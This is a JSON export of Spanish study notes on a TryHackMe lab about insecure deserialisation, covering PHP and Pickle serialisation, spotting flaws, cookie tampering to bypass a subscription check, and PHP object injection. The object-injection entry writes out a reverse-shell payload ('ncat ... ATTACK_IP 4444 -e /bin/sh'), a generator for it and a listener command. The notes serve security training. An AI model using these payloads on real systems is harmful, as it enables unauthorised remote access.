[
  {
    "title": "5. Exploitation - Update Properties",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/5-exploitation-update-properties/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/5. Exploitation - Update Properties.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "<h2>Actualizando las Propiedades de un Objeto</h2>\nEn esta tarea exploraremos un ejemplo práctico en PHP, usando una aplicación simple de compartir notas. Nuestra aplicación permite a los usuarios crear, guardar y compartir notas fácilmente. Los usuarios pueden introducir sus notas en la aplicación que son guardadas para referencias futuras. Además, los usuarios pueden compartir sus notas con otros, facilitando la colaboración y el intercambio de información. La aplicación también incluye funcionalidades basadas en suscripción, asegurando que sólo los usuarios suscritos tengan acceso a ciertas funcionalidades como compartir las notas. Puedes acceder a la web en `http://IP/case1`.\n\n![[Pasted image 20260120134821.png]]\n\nVamos a ver cómo se ha construído la aplicación.\n\n<h4>Definiendo la Clase Notes</h4>\nLa aplicación tiene una clase `Notes`, representando una nota en nuestra aplicación. Esta clase tiene tres propiedades privadas: `user`, `role` y `isSubscribed`. También tenemos métodos setter y getter para manipular la propiedad `isubscribed`.\n\n```php\nclass Notes {\n\n    private $user;\n    private $role;\n    private $isSubscribed;\n\n    public function __construct($user, $role, $isSubscribed) {\n        $this->user = $user;\n        $this->role = $role;\n        $this->isSubscribed = $isSubscribed;\n    }\n\n    public function setIsSubscribed($isSubscribed) {\n        $this->isSubscribed = $isSubscribed;\n    }\n\n    public function getIsSubscribed() {\n        return $this->isSubscribed;\n }\n}\n```\n\n<h4>Guardando la Información de Usuario en Cookies</h4>\nCuando un usuario visita niuestra aplicación web por primera vez, configura una cookie serializada que contiene su información. Esto incluye su nombre de usuario, rol y estado de subscripción (`isSubscribed`). Si el usuario es un miembro suscripto (**isSubscribed = true**), se les permite compartir notas.\n\n![[Pasted image 20260120150357.png]]\n\n<h4>Explotando la Vulnerabilidad</h4>\nEn este paso ilustraremos cómo un atacante puede explotar la vulnerabilidad modificando la cookie serializada para ganar acceso no autorizado a compartir notas.\n\n- **Serialised cookie:** Después de decodear el valor base64 encodeado de la cookie, obtenemos la siguiente representación serializada del objeto Notes.\n\n```php\nO:5:\"Notes\":3:{s:4:\"user\";s:5:\"guest\";s:4:\"role\";s:5:\"guest\";s:12:\"isSubscribed\";b:0;}\n```\n\n- `O:5:\"Notes\":3`: Esto representa un objeto (O) con la clase Notes, la cual tiene 3 propiedades.\n- `s:4:\"user\";s:5:\"guest\"`: Esto indica una string (s) con una longitud de 4 caracteres representando a la propiedad `user` con el valor \"guest\".\n- `s:4:\"role\";s:5:\"guest\"`: Esto similar al de arriba indica que la propiedad `role` tiene el valor \"guest\".\n- `s:12:\"isSubscribed\";b:0`: Representa un booleano (b) llamado `isSubscribed` con el valor falso (0).\n\n---------------------------------------------\n<h2>Explotando la Vulnerabilidad</h2>\nEl el escenario actual, cuando el usuario intenta compartir una nota, le sale el siguiente pop-up:\n\n![[Pasted image 20260120151116.png]]\n\nY bien, ¿qué está pasando en el backend? El código PHP del backend valida la cookie entrante, la deserializa, y luego valida si el usuario está o no suscrito. Nuestra tarea principal es bypassear eso.\n\nSupón que un atacante intercepta esta cookie serializada y modifica el valor de la propiedad `isSubscribed` de falso (0) a verdadero (1). El atacante puede manipular el estado de suscripción sin autorización legítima cambiando el valor booleano en la información serializada.\n\n![[Pasted image 20260120151337.png]]\n\nDespués de modificarlo, el atacante vuelve a base64 encodearlo y listo.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "3. Serialisation Formats",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/3-serialisation-formats/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/3. Serialisation Formats.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Aunque diferentes lenguajes de programación usan diferentes palabras clave y funciones para la serialización, el principio subyaciente permanece constante. La serialización es el proceso de convertir el estado de un objeto a un formato que pueda ser fácilmente almacenado o transmitido y luego reconstruído.\n\nAl contrario que otras vulnerabilidades comunes que explotan el procesamiento inmediato de los inputs del usuario, los problemas de deserialización insegura involucran una interacción más profunda con la lógica principal de la aplicación.\n\nExploremos cómo se maneja explícitamente la serialización en diferentes lenguaje, junto a su funcionalidad, sintaxis y cualidades particulares.\n\n---------------------------------------\n<h2>Serialización PHP</h2>\nEn PHP, la serialización se consigue usando la función `serialize()`. Esta convierte un objeto o array de PHP a un stream de bytes representando la información y estructura del objeto. El byte stream resultante puede incluir varios tipos de datos, como strings, arrays y objetos. Para ilustrarlo, consideremos una aplicación de notas donde los usuarios pueden guardar y recuperar sus notas. Crearemos una clase PHP llamada **Notes** para representar cada nota y manejar la serialización y deserialización.\n\n```php\nclass Notes {\n    public $Notescontent;\n\n    public function __construct($content) {\n        $this->Notescontent = $content;\n    }\n}\n```\n\nEn nuestra aplicación Notes, cuando un usuario guarda una nota, la serializamos usando `serialize()`. Esto convierte el objeto en una representación de string que puede ser guardada en un archivo o base de datos. Echemos un vistazo al siguiente trozo de código que serializa los objetos de la clase Notes.\n\n```php\n$note = new Notes(\"Welcome to THM\");\n$serialized_note = serialize($note);\n```\n\nEntramos en `http://IP/phptest/` e introducimos cualquier string para serializazr o deserializar. Por ejemplo, si introduces la string **Welcome to THM**, generará el output: `O:5:\"Notes\":1:{s:7:\"content\";s:14:\"Welcome to THM\";}`.\n\n![[Pasted image 20260120100215.png]]\n\nVamos a decodear el output:\n\n- `O:5:\"Notes\":1:`: Esta parte indica que la información serializada erpresenta un objeto de la clase Notes,  que tiene una propiedad.\n- `s:7:\"content\"`: Esto representa la propiedad llamada \"**content**\" con una longitud de 7 caracteres. En información serializada, las strings se representan con `s` seguido de la longitud  de la string y la string entre comillas. Los enteros se representan con una `i` seguido del valor numérico sin comillas.\n- `s:14:\"Welcome to THM\"`: Este es el valor de la propiedad **content** con una longitud de 14 caracteres.\n\n----------------------------------------\n<h2>Métodos Mágicos</h2>\nPHP ofrece varios [métodos mágicos](https://www.php.net/manual/en/language.oop5.magic.php) que juegan varios roles en el proceso de serialización. Algunos de estos métodos importantes se mencionan debajo:\n\n- `___sleep()`: Este método se llama en un objeto antes de la serialización. Limpia recursos, como conexiones a bases de datos y se espera que devuelva un array de nombres de propiedades que deberían ser serializadas.\n- `__wakeup()`: Este método es llamado al deserializar. Puede restablecer cualquier conexión que el objeto pueda necesitar para operar correctamente.\n- `__serialize()`: En PHP 7.4 este método permite personalizar la información de serializazción devolviendo un array representando la forma serializada del objeto.\n- `__unserialize()`: Es la contraparte de `__serialize()` y permite personalizar la restauración de un objeto desde su información serializada.\n\n--------------------------------------------------\n<h2>Python</h2>\nPython usa un módulo llamado **Pickle** para serializar y deserializar objetos. Este módulo convierte un objeto Python en un byte stram (y viceversa), permitiendo que sea guardado en un archivo o transmitido a través de la red. Maneja casi todos los tipos de objetos Python sin intervención manual. Seguiremos el mismo ejemplo de Notes de PHP con Python con `app.py`:\n\n```python\nimport pickle\nimport base64\n\n...\nserialized_data = request.form['serialized_data']\nnotes_obj = pickle.loads(base64.b64decode(serialized_data))\nmessage = \"Notes successfully unpickled.\"\n...\n\nelif request.method == 'POST':\n    if 'pickle' in request.form:\n        content = request.form['note_content']\n        notes_obj.add_note(content)\n        pickled_content = pickle.dumps(notes_obj)\n        serialized_data = base64.b64encode(pickled_content).decode('utf-8')\n        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)\n        message = \"Notes pickled successfully.\"\n```\n\n<h4>Pickling Process</h4>\n- **Creando la clase Notes:** Esta clase maneja una lista de notas. Ofrece métodos para añadir una nota y recuperar todas, haciendo fácil manejar el estado de la aplicación.\n- **Serialización (Pickling):** Cuando un usuario sube una nota, la instancia de clase Notes se serializa (todas las notas) usando `pickle.dumps()`. Esta función transforma el objeto Python en formato binario que puede reconvertirse más adelante.\n\n<h4>Mostrando la Información Serializada (Base64 Encoding)</h4>\n- **Por qué usar base64:** La información serializazda es binaria y no segura de mostrar en todos los entornos. La información binaria puede contener bytes que pueden interferir con protocolos de comunicación (como HTTP). Base64 es un esquema de encodeado que convierte información binaria en texto plano. Sólo usa caracteres legibles haciéndolo seguro de transmitir por canales que no soportan información binaria.\n- **Proceso de Encoding:** Después de serializar el objeto `Notes`, la información binaria se encodea en base64 usando `base64.b643ncode()`. Esta string es segura de mostrar en HTML y fácil de guardar o transmitir.\n\n<h4>Deserialización</h4>\n- **Base64 decoding:** Al hacer unpickling, la string base64 se decodea de vuelta a un formato binario usando `base64.b64deconde()`.\n- **Unpickling:** Los datos binarios se pasan a `pickle.loads()` lo que reconstruye el objeto original de Python del binary stream.\n\nDe nuevo, si visitamos el link `http://IP:5000` e introducimos la string **Welcome to THM**:\n\n![[Pasted image 20260120122602.png]]\n\n- **Pickling:** Cuando la string se picklea se convierte en formato binario que no es legible por humanos.\n- **Base64 encoding:** El binario se encodea en Base64.\n\nEn Java la serialización de objetos la lleva a cabo `Serializable`. Para .NET, inicialmente fue `BinaryFormatter` y ahora `System.Text.Json` para serializaciones JSON o `System.Xml.Serialization` para tareas XML. Ruby ofrece simplicidad con su módulo `Marshal`.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "4. Identification",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/4-identification/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/4. Identification.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Después de un entendimiento completo de la serialización a lo largo de diferentes lenguajes de programación, transicionaremos ahora a un aspecto crítico de la ciberseguridad, explotando y mitigando vulnerabilidades relacionadas a la serialización. Antes de ver las técnicas de explotación es necesario aprender a identificar estas vulnerabilidades en las aplicaciones, ya tengamos acceso al código o no.\n\n--------------------------------------\n<h2>Acceso al Código Fuente</h2>\nCuando tenemos acceso al código fuente, identificar las vulnerabilidades de serialización puede ser más directo, pero requiere un buen entendimiento de dónde y qué buscar. Por ejemplo en busca de funciones como `serialize()`, `unserialize()` o `pickle.loads()`. Debemos prestar especial atención a cualquier punto donde el input del usuario sea pasado directamente a estas funciones.\n\n---------------------------------------------\n<h2>Sin Acceso al Código Fuente</h2>\nAl auditar una aplicación sin acceso al código fuente, el reto recae en deducir cómo se procesa la información basado en observaciones e interacciones externas. Esto es comúnmente conocido como **black-box testing**. Una técnica bastante usada para intentar acceder a backups o archivos temporales creados por editores de texto es añadir `~` al final de un archivo PHP.\n\n<h4>Analizando Respuestas del Servidor</h4>\n- **Mensajes de error:** Ciertos mensajes de error pueden indicar indirectamente problemas con las serialización. Por ejemplo, PHP puede que mande errores o avisos que contengan frases como `unserialize()` u **Object deserialisation error** que revela procesos de serialización y puntos de vulnerabilidad potenciales.\n- **Inconsistencias en el comportamiento de la aplicación:** Desde comportamiento inesperado en la respuesta hasta input manipulado, pueden sugerir problemas con cómo se deserializa y maneja la información. Observar cómo maneja información serializada alterada la aplicación  puede ofrecer pistas sobre código potencialmente vulnerable.\n\n<h4>Examinando Cookies</h4>\nLas cookies se suelen usar para guardar información serializada en aplicaciones web. Examinando los contenidos de la cookie podemos soler inferir:\n\n- **Valores base64 encodeados en cookies (PHP y .NET):** Si las cookies contienen información que se ve como base64 encoded, decodearla puede revelar objetors o estructuras de datos serializazdos. PHP suele usar serialización para manejo de sesiones y guardar variables de sesión en formato serializado.\n- **View State ASP.NET:** Las aplicaciones .NET puede que usen la serialización en el view state mandado al navegador del cliente. Un campo llamado `__VIEWSTATE`, que está base64 encodeado, puede verse a veces. Decodearlo y examinarlo puede revelar si contiene datos serializados potencialmente explotables.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "6. Exploitation - Object Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/6-exploitation-object-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/6. Exploitation - Object Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "La inyección de objetos es una vulnerabilidad que surge de la deserialización de información insegura en las aplicaciones web. Ocurre cuando datos no confiables se deserializan en un objeto, permitiendo a los atacantes manipular la información serializada para ejecutar código arbitrario.\n\nPara explotar una vulnerabilidad de inyección de objetos PHP, la aplicación debería incluir una clase con un método mágico de PHP. como `__wakeup` o `__sleep` que pueden ser explotados. Todas las clases involucradas en el ataque deberían ser declaradas antes de llamar al método `serialize()` ( a no ser que el object autoloading esté habilitado).\n\n<h4>Ejemplo</h4>\nConsideremos un trozo de código `index.php` que muestra la serialización y deserialización usando el `serialize()` y `unserialize()`. El código acepta el parámetro GET decode o encode y convierte el input del usuario en concordancia.\n\n```php\n<?php\nclass UserData {\n    private $data;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n..\nrequire 'test.php';\nif(isset($_GET['encode'])) {\n    $userData = new UserData($_GET['encode']);\n    $serializedData = serialize($userData);\n    $base64EncodedData = base64_encode($serializedData);\n    echo \"Normal Data: \" . $_GET['encode'] . \"<br>\";\n    echo \"Serialized Data: \" . $serializedData . \"<br>\";\n    echo \"Base64 Encoded Data: \" . $base64EncodedData;\n\n} elseif(isset($_GET['decode'])) {\n    $base64EncodedData = $_GET['decode'];\n    $serializedData = base64_decode($base64EncodedData);\n    $test = unserialize($serializedData);\n    echo \"Base64 Encoded Serialized Data: \" . $base64EncodedData . \"<br>\";\n    echo \"Serialized Data: \" . $serializedData;\n\n...\n```\n\nPor ejemplo, si mandamos el input **hellothm** vía la URL `http://IP/case2/?encode=hellothm`, obtendremos el siguiente output:\n\n![[Pasted image 20260120152934.png]]\n\nVemos que el código incluye un archivo llamado `test.php`. Desde una revisión de código, considerando si el framework es opensource, el pentester sabe que `test.php` contiene una clase llamada `MaliciousUserData` como se muestra:\n\n```php\n<?php\nclass MaliciousUserData {\npublic $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server\n    \n    public function __wakeup() { \n    exec($this->command);\n...\n\n?>\n```\n\nEn el código de arriba, aunque hay deserialización insegura, es posible manipular las propiedades de un objeto, incluyendo alterar la propiedad `command` de la clase `MaliciousUserData` en el código de arriba. Esto puede conseguirse construyendo una string serializada específica que contenga los valores de propiedades deseados. Por ejemplo, si queremos modificar la propiedad `command` para ejecutar un comando diferente, podemos serializar un objeto con el valor de propiedad deseado e inyectarlo en la función vulnerable `unserialize()`. De esta forma al ser deserializado la propiedad modificada será cargada en el objeto.\n\nEs importante entender que durante la deserializaión insegura no puedes actualizar directamente la definición del método `__wakeup` en sí mismo. Es parte de la definición de clase y se mantiene estático durante el proceso de deserialización. Sin embargo, puedes modificar el comportamiento o propiedades del objeto en el método `__wakeup`. Esto significa que mientras que la definición del método se mantiene constante, sus acciones al deserializarse pierden ser manipuladas.\n\n-----------------------------------------------------\n<h2>Preparando el Payload</h2>\nComo ya hemos visto, llamar a otra clase es una funcionalidad normal de PHP, y puedes ver el código de ese archivo si la página está usando código abierto. El código en `index.php` deserializa el input sin realizar ninguna sanitización. ¿Qué pasa si cambiamos la clase `MaliciousUserData` y modificamos el atributo `command` para que cuando se llame a la función `__wakeup` sea llamada con el valor del atacante?\n\nVamos a crear código PHP que genere información serializada maliciosa.\n\n```php\n<?php\nclass MaliciousUserData {\npublic $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';\n}\n\n$maliciousUserData = new MaliciousUserData();\n$serializedData = serialize($maliciousUserData);\n$base64EncodedData = base64_encode($serializedData);\necho \"Base64 Encoded Serialized Data: \" . $base64EncodedData;\n?>\n```\n\n- En el código de arriba, la función `_wakeup()` de la clase `MaliciousUserData` (`test.php`) ejecutara una reverse shell usando `ncat` para conectarse a la `ATTACK_IP` por el puerto `4444` con la flag `-e` para ejecutar `/bin/sh` como una shell.\n- Una vez creado el archivo, ejecútalo con `php index.php`. Esto devolverá un objeto serializado en base64 de la clase `MaliciousUserData`.\n- La string encodeada en base 64 generada se vera como: `TzoxNzoiTWFsaWNp[Redacted]`.\n- Empezamos el listener usando `nc -nvlp 4444`.\n- Ahora explotamos la deserialización insegura yendo a `http://10.64.169.42/case2/?decode=[SHELLCODE]`.\n- Una vez que visitemos la URL, la string se deserializan  y ejecuta la función `__wakeup()`.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "2. Some Important Concepts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/2-some-important-concepts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/2. Some Important Concepts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Antes de hablar sobre deserialización insegura en detalle, es crucial entender el concepto básico.\n\n----------------------------------------\n<h2>Serialización</h2>\nPiensa en la serialización como preparar tu mochila por la mañana. Tienes libros, cuadernos, botella de agua y tienes que organizarlo en tu mochila. La seriialización es coger diferentes piezas de información y ponerlas juntas para hacer que sean fáciles de guardar o mandar.\n\n![[Pasted image 20260119113302.png]]\n\nEn programación, la serialización es el proceso de transformar el estado de un objeto en formato legible por humanos o binario que puede ser guardado o transmitido y reconstruído cuando se requiera. Esta capacidad es esencial en aplicaciones donde la información debe ser transferida entre partes diferentes de un sistema o a través de la red. En PHP este proceso lo realiza la función `serialize()`.\n\n<h4>Ejemplo</h4>\n```php\n<?php\n$noteArray = array(\"title\" => \"My THM Note\", \"content\" => \"Welcome to THM!\");\n$serialisedNote = serialize($noteArray);  // Converting the note into a storable format\nfile_put_contents('note.txt', $serialisedNote);  // Saving the serialised note to a file\n?>\n```\n\nEl siguiente output muestra la string serializada en el archivo `note.txt`, el cual incluye detalles de la estructura y contenido de la nota.\n\n**Serialised Note**: `a:2:{s:5:\"title\";s:12:\"My THM Note\";s:7:\"content\";s:12:\"Welcome to THM!\";}`\n\n-----------------------------------------------\n<h2>Deserialización</h2>\nImagina que llegas a la escuela y necesitas lo que has guardado en la mochila esta mañana. La deserialización es como desempaqueta tu mochila cuando llegas a clase. La deserialización es el proceso de convertir la información formateada de vuelta en un objeto. Es crucial para recuperar información de archivos, bases de datos o a través de la red.\n\n![[Pasted image 20260119113938.png]]\n\nSiguiendo el anterior ejemplo, aquí está cómo deserializaríamos la nota en PHP:\n\n```php\n<?php\n$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file\n$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array\necho \"Title: \" . $noteArray['title'] . \"<br>\";\necho \"Content: \" . $noteArray['content'];\n?>\n```\n\nEste código lee la nota serializada de un archivo y la convierte de vuelta en un array, reconstruyendo la nota original.\n\n-------------------------------------------------\n<h2>Incidentes Específicos que Involucran Vulnerabilidades de Serialización</h2>\nHablemos de incidentes específicos donde las vulnerabilidades de serialización jugaron un rol crítico en las brechas de ciberseguridad.\n\n<h4>Log4j Vulnerability CVE-2021-44228</h4>\n- **Incidente:** La [vulnerabilidad Log4j](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), o Log4Shell, es una debilidad de seguridad crítica encontrada en la librería Log4j de Apache2, usada ampliamente en aplicaciones Java. Esta vulnerabilidad permite a los atacantes ejecutar código arbitrario en los sistemas afectados explotando la funcionalidad de deserialización insegura de la librería.\n- **Impacto:** El hecho de permitir a los atacantes ejecutar código arbitrario hizo que los atacantes pudieran comprometer infraestructura crítica, llevando a acceso no autorizado, disrupción del servicio y ataques de cadena de suministro.\n\n<h4>WebLogic Server Remote Code Execution CVE-2015-4852</h4>\n- **Incidente:** Esta vulnerabilidad estaba relacionada con cómo el [Servidor WebLogic de Oracle](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) mandaba la información al protocolo T3. Los atacantes podían mandar objetos maliciosos al servidor, que al deserializarlo llevaba a RCE.\n- **Impacto:** Esta vulnerabilidad fue ampliamente explotada para ganar acceso no autorizado a sistemas, desplegar ransomware o robar informaciñon. Afectó a las versiones de WebLogic server que no deshabilitó el servicio vulnerable o pparcheó el problema.\n\n<h4>Jenkins Java Deserialisation CVE-2016-0792</h4>\n- **Incidente:** [Jenkins](https://www.tenable.com/plugins/nessus/89034) es un servidor de automatización popular usado en el desarrollo de software. Experimentó una vulnerabilidad crítica que involucraba la deserialización Java. Los atacantes podían mandar payloads serializados a Jenkins CLI, la cual al deserializar permitía RCE.\n- **Impacto:** Permitió a atacantes ejecutar comandos de shell, potencialmente tomando posesión del servidor Jenkins.",
    "modified": "2026-01-20T00:54:21"
  }
]